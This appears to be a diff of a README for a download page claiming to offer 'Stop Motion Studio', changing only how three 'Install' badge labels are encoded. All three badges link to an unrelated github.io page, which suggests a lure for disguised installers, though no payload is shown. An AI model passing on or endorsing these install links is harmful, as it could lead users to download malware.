@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Stop Motion Studio](https://img.shields.io/badge/⬇_Install_Stop%20Motion%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stop Motion Studio](https://img.shields.io/badge/⬇_Install_Stop+Motion+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Stop Motion Studio is a user-friendly stop motion animation app for desktop and 
 
 <div align="center">
 
-[![⬇ Install Stop Motion Studio](https://img.shields.io/badge/⬇_Install_Stop%20Motion%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stop Motion Studio](https://img.shields.io/badge/⬇_Install_Stop+Motion+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Stop Motion Studio is a user-friendly stop motion animation app for desktop and 
 
 <div align="center">
 
-[![⬇ Install Stop Motion Studio](https://img.shields.io/badge/⬇_Install_Stop%20Motion%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Stop Motion Studio](https://img.shields.io/badge/⬇_Install_Stop+Motion+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
